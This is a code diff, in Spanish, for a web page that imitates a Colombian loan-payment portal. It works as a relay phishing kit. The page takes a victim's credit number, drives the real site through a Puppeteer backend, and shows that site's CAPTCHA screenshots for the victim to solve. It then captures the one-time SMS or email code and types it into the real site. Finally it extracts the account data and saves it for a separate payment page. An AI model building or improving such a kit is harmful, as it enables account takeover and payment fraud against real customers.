@@ -49,10 +49,20 @@
         .form-step.visible{display:block}
         @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
 
+        /* CAPTCHA viewer — solo visible si hay CAPTCHA */
         .live-viewer{position:relative;border:1px solid #eee;border-radius:12px;overflow:hidden;margin-bottom:20px;background:#fafafa;cursor:crosshair}
         .live-viewer img{width:100%;display:block}
         .live-viewer .loading-overlay{position:absolute;inset:0;background:rgba(255,255,255,.85);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:5}
         .live-viewer .loading-overlay p{font-size:13px;color:#666;margin-top:10px}
+
+        /* Opciones OTP — cards de selección */
+        .otp-options{display:flex;gap:15px;margin-bottom:25px;flex-wrap:wrap}
+        .otp-option-card{flex:1;min-width:180px;padding:20px;border:2px solid #e0e0e0;border-radius:12px;cursor:pointer;transition:all .3s;text-align:center}
+        .otp-option-card:hover{border-color:#e65c00;background:#fff8f4}
+        .otp-option-card.selected{border-color:#e65c00;background:#fff8f4}
+        .otp-option-card .opt-icon{font-size:28px;margin-bottom:8px}
+        .otp-option-card .opt-label{font-size:13px;font-weight:600;color:#242833}
+        .otp-option-card .opt-desc{font-size:11px;color:#888;margin-top:4px}
 
         .otp-row{display:flex;gap:12px;align-items:flex-end;margin-bottom:20px}
         .otp-row .input-group{flex:1;margin-bottom:0}
@@ -74,7 +84,6 @@
         .result-box.success{background:#e8f5e9;border:1px solid #a5d6a7;color:#2e7d32}
         .result-box.error{background:#fce4ec;border:1px solid #ef9a9a;color:#c62828}
         .result-box.info{background:#e3f2fd;border:1px solid #90caf9;color:#1565c0}
-        .result-box pre{white-space:pre-wrap;word-break:break-word;font-size:12px;max-height:300px;overflow-y:auto;margin-top:8px;font-family:'Courier New',monospace}
 
         .footer{background:#fff;padding:40px;font-size:11px;color:#666;line-height:1.6;margin-top:auto}
         .footer p{margin-bottom:12px}
@@ -94,6 +103,8 @@
             .footer img{height:60px}
             .otp-row{flex-direction:column}
             .otp-row .btn-verify{width:100%}
+            .otp-options{flex-direction:column}
+            .otp-option-card{min-width:unset}
             .left-panel h2{font-size:1rem;margin-bottom:10px}
             .left-panel p{font-size:12px;margin-bottom:12px}
             .left-panel ol{font-size:12px;margin-bottom:15px}
@@ -120,17 +131,17 @@
             <p>Hemos implementado unas verificaciones rápidas para proteger la información:</p>
             <ol>
                 <li>Ingresa el <strong>número de crédito</strong>.</li>
-                <li>Haz la validación a través de <strong>imágenes</strong>.</li>
-                <li>Ingresa el <strong>código</strong> de un solo uso que recibirás en tu número celular o en tu correo electrónico registrado</li>
+                <li>Selecciona el medio para recibir tu <strong>código de verificación</strong>.</li>
+                <li>Ingresa el <strong>código</strong> de un solo uso que recibirás en tu celular o correo electrónico registrado.</li>
                 <li>Revisa tu crédito y <strong>realiza el pago</strong> de forma segura.</li>
             </ol>
             <p>Tus medios de pago, valores y fechas siguen siendo los mismos.</p>
             <div class="contact-info">
                 <p>¿No recuerdas tu número de crédito o no recibes el código? Comunícate con nuestras líneas de atención:</p>
                 <ul>
-                    <li>• Celular: 350 318 9889</li>
-                    <li>• Bogotá: (601) 491 8516</li>
-                    <li>• Medellín: (604) 480 3474</li>
+                    <li>Celular: 350 318 9889</li>
+                    <li>Bogotá: (601) 491 8516</li>
+                    <li>Medellín: (604) 480 3474</li>
                 </ul>
             </div>
         </div>
@@ -144,47 +155,54 @@
                 <div class="step" id="stepItem3"><div class="step-circle">3</div><span>Verificación</span></div>
             </div>
 
-            <!-- PASO 1: Crédito -->
+            <!-- PASO 1: Número de crédito -->
             <div id="formStep1" class="form-step visible">
                 <p class="helper-text">Paso 1 de 3 — Ingresa tu número de crédito.</p>
                 <div class="input-group">
                     <label>Número de crédito <span>*</span></label>
                     <div class="input-wrapper">
-                        <input type="text" id="creditNumber" placeholder="">
+                        <input type="text" id="creditNumber" placeholder="" inputmode="numeric">
                         <span class="input-hint">Solo números, sin espacios.</span>
                     </div>
                 </div>
                 <button class="btn-continue" id="btnStart" disabled onclick="iniciarSesion()">CONTINUAR</button>
             </div>
 
-            <!-- PASO 2: CAPTCHA interactivo via screenshot -->
-            <div id="formStep2" class="form-step">
-                <p class="helper-text">Paso 2 de 3 — Resuelve la verificación de seguridad haciendo clic en las imágenes.</p>
+            <!-- PASO 2A: CAPTCHA (solo si aparece) -->
+            <div id="formStepCaptcha" class="form-step">
+                <p class="helper-text">Verificación de seguridad — Resuelve el CAPTCHA haciendo clic en las imágenes.</p>
                 <div class="live-viewer" id="liveViewer" onclick="handleViewerClick(event)">
-                    <img id="liveScreenshot" src="" alt="Sitio en vivo">
+                    <img id="liveScreenshot" src="" alt="Verificación">
                     <div class="loading-overlay" id="viewerLoading" style="display:none">
                         <div class="spinner" style="width:30px;height:30px;border-width:4px;border-color:rgba(230,92,0,.2);border-top-color:#e65c00"></div>
                         <p>Procesando...</p>
                     </div>
                 </div>
-                <button class="btn-orange" id="btnSubmitCaptcha" onclick="clickBotonSitio('continuar')">ENVIAR VERIFICACIÓN</button>
+                <button class="btn-orange" id="btnSubmitCaptcha" onclick="enviarCaptcha()">VERIFICAR</button>
                 <button class="btn-orange" style="margin-top:10px;background:#242833" onclick="refreshScreenshot()">ACTUALIZAR VISTA</button>
             </div>
 
-            <!-- PASO 3: OTP -->
+            <!-- PASO 2B: Selección método OTP (SMS o Correo) -->
+            <div id="formStep2" class="form-step">
+                <p class="helper-text">Paso 2 de 3 — Selecciona cómo deseas recibir tu código de verificación.</p>
+                <div class="otp-options" id="otpOptionsContainer"></div>
+                <button class="btn-continue" id="btnSendOtp" disabled onclick="seleccionarMetodoOtp()">ENVIAR CÓDIGO</button>
+            </div>
+
+            <!-- PASO 3: Ingresar OTP -->
             <div id="formStep3" class="form-step">
-                <p class="helper-text">Paso 3 de 3 — Ingresa el código que recibiste en tu celular o correo.</p>
+                <p class="helper-text" id="otpSentMsg">Paso 3 de 3 — Ingresa el código que recibiste.</p>
                 <div class="input-group">
                     <label>Código de verificación <span>*</span></label>
                     <div class="otp-row">
                         <div class="input-group">
                             <div class="input-wrapper">
-                                <input type="text" id="otpCode" placeholder="Código de 6 dígitos" maxlength="6">
+                                <input type="text" id="otpCode" placeholder="Código de 6 dígitos" maxlength="6" inputmode="numeric">
                             </div>
                         </div>
                         <button class="btn-verify" id="btnVerify" onclick="enviarOtp()">VERIFICAR</button>
                     </div>
-                    <span class="input-hint">El código fue enviado a tu celular o correo registrado.</span>
+                    <span class="input-hint" id="otpHintText">El código fue enviado a tu celular o correo registrado.</span>
                 </div>
             </div>
 
@@ -215,6 +233,8 @@
 <script>
 const API = window.location.origin;
 let currentSessionId = null;
+let selectedOtpOption = null;
+let otpOptionsList = [];
 
 function updateStepper(step) {
     for (let i = 1; i <= 3; i++) {
@@ -226,12 +246,17 @@ function updateStepper(step) {
     }
 }
 
-function showStep(n) {
-    ['formStep1','formStep2','formStep3','formStepResult'].forEach(id =>
+function hideAllSteps() {
+    ['formStep1','formStepCaptcha','formStep2','formStep3','formStepResult'].forEach(id =>
         document.getElementById(id).classList.remove('visible'));
-    const map = { 1:'formStep1', 2:'formStep2', 3:'formStep3', 4:'formStepResult' };
-    if (map[n]) document.getElementById(map[n]).classList.add('visible');
-    updateStepper(Math.min(n, 3));
+}
+
+function showStep(name) {
+    hideAllSteps();
+    document.getElementById(name).classList.add('visible');
+    // Stepper mapping
+    const stepMap = { formStep1: 1, formStepCaptcha: 2, formStep2: 2, formStep3: 3, formStepResult: 3 };
+    updateStepper(stepMap[name] || 1);
 }
 
 document.getElementById('creditNumber').addEventListener('input', function () {
@@ -240,13 +265,17 @@ document.getElementById('creditNumber').addEventListener('input', function () {
     else { btn.classList.remove('active'); btn.disabled = true; }
 });
 
-// 1. INICIAR — manda crédito, Puppeteer abre Mobilize con IP Geonode
+// ============================================================
+// PASO 1: Enviar crédito → Puppeteer llena + clic Continuar
+// ============================================================
 async function iniciarSesion() {
     const credit = document.getElementById('creditNumber').value.trim();
     if (!credit) return;
     const btn = document.getElementById('btnStart');
     btn.disabled = true;
-    btn.innerHTML = '<span class="spinner"></span> Conectando con Mobilize...';
+    btn.innerHTML = '<span class="spinner"></span> Conectando...';
+    showMsg('', '');
+
     try {
         const r = await fetch(API + '/api/start', {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -255,9 +284,34 @@ async function iniciarSesion() {
         const data = await r.json();
         if (!r.ok) throw new Error(data.error || 'Error al conectar');
         currentSessionId = data.sessionId;
-        document.getElementById('liveScreenshot').src = data.screenshot;
-        showStep(2);
-        showMsg('', '');
+
+        // ¿Hay CAPTCHA?
+        if (data.hasCaptcha && data.screenshot) {
+            document.getElementById('liveScreenshot').src = data.screenshot;
+            showStep('formStepCaptcha');
+            return;
+        }
+
+        // ¿Hay opciones OTP?
+        if (data.otpOptions && data.otpOptions.length > 0) {
+            renderOtpOptions(data.otpOptions);
+            showStep('formStep2');
+            return;
+        }
+
+        // Si no hay opciones detectadas, revisar texto de la página
+        const txt = (data.bodyText || '').toLowerCase();
+        if (txt.includes('código') || txt.includes('otp') || txt.includes('enviado')) {
+            // Ya se envió el OTP directamente (sin pedir opción)
+            showStep('formStep3');
+            document.getElementById('otpSentMsg').textContent = 'Paso 3 de 3 — Ingresa el código que recibiste.';
+            showMsg('Código enviado a tu celular o correo registrado.', 'info');
+            return;
+        }
+
+        // Si nada, puede ser error — mostrar bodyText para debug
+        showMsg('No se pudieron detectar las opciones. Texto de la página: ' + (data.bodyText || '').substring(0, 200), 'error');
+
     } catch (err) {
         showMsg(err.message, 'error');
     } finally {
@@ -269,7 +323,104 @@ async function iniciarSesion() {
     }
 }
 
-// 2. CLICK en screenshot — usuario resuelve CAPTCHA real
+// ============================================================
+// Renderizar opciones OTP como cards
+// ============================================================
+function renderOtpOptions(options) {
+    otpOptionsList = options;
+    selectedOtpOption = null;
+    const container = document.getElementById('otpOptionsContainer');
+    container.innerHTML = '';
+
+    options.forEach((opt, i) => {
+        const card = document.createElement('div');
+        card.className = 'otp-option-card';
+        card.setAttribute('data-index', i);
+
+        // Detectar si es SMS o correo por el texto
+        const labelLow = opt.label.toLowerCase();
+        let icon = '📱';
+        let desc = 'Recibe un SMS a tu celular registrado';
+        if (labelLow.includes('correo') || labelLow.includes('email') || labelLow.includes('mail')) {
+            icon = '✉️';
+            desc = 'Recibe un código a tu correo electrónico';
+        } else if (labelLow.includes('sms') || labelLow.includes('celular') || labelLow.includes('mensaje') || labelLow.includes('teléfono')) {
+            icon = '📱';
+            desc = 'Recibe un SMS a tu celular registrado';
+        }
+
+        card.innerHTML = '<div class="opt-icon">' + icon + '</div>' +
+            '<div class="opt-label">' + esc(opt.label) + '</div>' +
+            '<div class="opt-desc">' + desc + '</div>';
+
+        card.onclick = function() {
+            document.querySelectorAll('.otp-option-card').forEach(c => c.classList.remove('selected'));
+            card.classList.add('selected');
+            selectedOtpOption = i;
+            const btn = document.getElementById('btnSendOtp');
+            btn.classList.add('active');
+            btn.disabled = false;
+        };
+
+        container.appendChild(card);
+    });
+}
+
+// ============================================================
+// PASO 2B: Usuario escoge SMS o correo → Puppeteer hace clic en el real
+// ============================================================
+async function seleccionarMetodoOtp() {
+    if (selectedOtpOption === null) return;
+    const opt = otpOptionsList[selectedOtpOption];
+    const btn = document.getElementById('btnSendOtp');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span> Enviando código...';
+
+    try {
+        const r = await fetch(API + '/api/select-otp', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                sessionId: currentSessionId,
+                optionIndex: opt.index,
+                optionType: opt.type,
+                optionValue: opt.value,
+            }),
+        });
+        const data = await r.json();
+        if (!r.ok) throw new Error(data.error || 'Error');
+
+        // ¿Apareció CAPTCHA después de seleccionar?
+        if (data.hasCaptcha && data.screenshot) {
+            document.getElementById('liveScreenshot').src = data.screenshot;
+            showStep('formStepCaptcha');
+            return;
+        }
+
+        // Ir al paso OTP
+        const labelLow = opt.label.toLowerCase();
+        let medio = 'celular o correo';
+        if (labelLow.includes('correo') || labelLow.includes('email') || labelLow.includes('mail')) {
+            medio = 'correo electrónico';
+        } else if (labelLow.includes('sms') || labelLow.includes('celular') || labelLow.includes('mensaje')) {
+            medio = 'celular';
+        }
+        document.getElementById('otpSentMsg').textContent = 'Paso 3 de 3 — Ingresa el código que recibiste en tu ' + medio + '.';
+        document.getElementById('otpHintText').textContent = 'El código fue enviado a tu ' + medio + ' registrado.';
+        showStep('formStep3');
+        showMsg('Código enviado a tu ' + medio + ' registrado.', 'info');
+
+    } catch (err) {
+        showMsg(err.message, 'error');
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = 'ENVIAR CÓDIGO';
+        if (selectedOtpOption !== null) { btn.classList.add('active'); btn.disabled = false; }
+    }
+}
+
+// ============================================================
+// CAPTCHA: click en screenshot + enviar
+// ============================================================
 async function handleViewerClick(event) {
     if (!currentSessionId) return;
     const img = event.currentTarget.querySelector('img');
@@ -307,39 +458,55 @@ async function refreshScreenshot() {
     } catch (err) { showMsg('Error: ' + err.message, 'error'); }
 }
 
-// Click en botón del sitio real (Continuar, Verificar, etc.)
-async function clickBotonSitio(texto) {
+async function enviarCaptcha() {
     if (!currentSessionId) return;
     const btn = document.getElementById('btnSubmitCaptcha');
     btn.disabled = true;
-    btn.innerHTML = '<span class="spinner"></span> Enviando...';
+    btn.innerHTML = '<span class="spinner"></span> Verificando...';
     try {
+        // Click "Continuar" / "Verificar" en el sitio real
         const r = await fetch(API + '/api/click-button', {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: currentSessionId, text: texto }),
+            body: JSON.stringify({ sessionId: currentSessionId, text: 'continuar' }),
         });
         const data = await r.json();
-        if (!r.ok) throw new Error(data.error);
-        document.getElementById('liveScreenshot').src = data.screenshot;
 
-        // Revisar si pasó al OTP
+        // Esperar y verificar qué sigue
+        await new Promise(resolve => setTimeout(resolve, 2000));
+
         const ext = await fetch(API + '/api/extract', {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ sessionId: currentSessionId }),
         });
-        const p = await ext.json();
-        const txt = (p.text || '').toLowerCase();
-        if (txt.includes('otp') || txt.includes('código') || txt.includes('code') || txt.includes('enviado')) {
-            showStep(3);
-            showMsg('Código enviado a tu celular o correo registrado.', 'info');
+        const pageData = await ext.json();
+
+        // Detectar opciones OTP después del CAPTCHA
+        const startR = await fetch(API + '/api/detect-state', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: currentSessionId }),
+        });
+        const state = await startR.json();
+
+        if (state.otpOptions && state.otpOptions.length > 0) {
+            renderOtpOptions(state.otpOptions);
+            showStep('formStep2');
         } else {
-            showMsg('Haz clic en las imágenes correctas y luego presiona ENVIAR.', 'info');
+            // Puede que ya haya ido directo al OTP
+            showStep('formStep3');
+            showMsg('Código enviado a tu celular o correo registrado.', 'info');
         }
-    } catch (err) { showMsg('Error: ' + err.message, 'error'); }
-    finally { btn.disabled = false; btn.innerHTML = 'ENVIAR VERIFICACIÓN'; }
+
+    } catch (err) {
+        showMsg('Error: ' + err.message, 'error');
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = 'VERIFICAR';
+    }
 }
 
-// 3. ENVIAR OTP al sitio real
+// ============================================================
+// PASO 3: Enviar OTP → Puppeteer digita en el sitio real
+// ============================================================
 async function enviarOtp() {
     const code = document.getElementById('otpCode').value.trim();
     if (!code) return showMsg('Ingresa el código', 'error');
@@ -352,11 +519,11 @@ async function enviarOtp() {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 sessionId: currentSessionId,
-                selector: 'input[formcontrolname="otp"], input[name="otp"], input[type="text"], input[maxlength="6"]',
+                selector: 'input[formcontrolname="otp"], input[name="otp"], input[type="tel"], input[maxlength="6"], input[inputmode="numeric"]',
                 text: code,
             }),
         });
-        // Click Verificar
+        // Click Verificar / Continuar
         await fetch(API + '/api/click-button', {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ sessionId: currentSessionId, text: 'verificar' }),
@@ -369,23 +536,26 @@ async function enviarOtp() {
             body: JSON.stringify({ sessionId: currentSessionId }),
         });
         const pageData = await ext.json();
-        const ss = await fetch(API + '/api/screenshot', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: currentSessionId }),
-        });
-        const ssData = await ss.json();
+
+        // Guardar datos para pago.html
+        try {
+            sessionStorage.setItem('mobilize_credit', JSON.stringify(pageData));
+            sessionStorage.setItem('mobilize_session', currentSessionId);
+        } catch(e) {}
 
         document.getElementById('resultData').innerHTML =
-            '<div style="background:#f8f9fa;border-radius:10px;padding:20px;margin-bottom:15px">' +
+            '<div style="background:#f8f9fa;border-radius:10px;padding:20px">' +
             '<h4 style="font-size:14px;color:#242833;margin-bottom:10px">Datos del crédito</h4>' +
-            '<pre style="white-space:pre-wrap;word-break:break-word;font-size:12px;font-family:Courier New,monospace">' +
-            esc(pageData.text || 'Sin datos') + '</pre></div>' +
-            '<img src="' + ssData.screenshot + '" style="width:100%;border-radius:10px;border:1px solid #eee">';
+            '<pre style="white-space:pre-wrap;word-break:break-word;font-size:12px;font-family:Courier New,monospace;max-height:400px;overflow-y:auto">' +
+            esc(pageData.text || 'Sin datos') + '</pre></div>';
 
-        showStep(4);
+        showStep('formStepResult');
         showMsg('', '');
+
+        // Cerrar sesión
         fetch(API + '/api/close', { method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ sessionId: currentSessionId }) });
+
     } catch (err) { showMsg('Error: ' + err.message, 'error'); }
     finally { btn.disabled = false; btn.innerHTML = 'VERIFICAR'; }
 }
@@ -395,10 +565,14 @@ function resetAll() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ sessionId: currentSessionId }) });
     currentSessionId = null;
+    selectedOtpOption = null;
+    otpOptionsList = [];
     document.getElementById('creditNumber').value = '';
     document.getElementById('otpCode').value = '';
     document.getElementById('liveScreenshot').src = '';
-    showStep(1); showMsg('', '');
+    document.getElementById('otpOptionsContainer').innerHTML = '';
+    showStep('formStep1');
+    showMsg('', '');
     document.getElementById('btnStart').classList.remove('active');
     document.getElementById('btnStart').disabled = true;
 }
@@ -410,7 +584,7 @@ function showMsg(m, t) {
 }
 function esc(t) { return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 
-// Auto-scroll al formulario en móvil apenas carga
+// Auto-scroll al formulario en móvil
 window.addEventListener('load', function() {
     if (window.innerWidth <= 900) {
         setTimeout(function() {
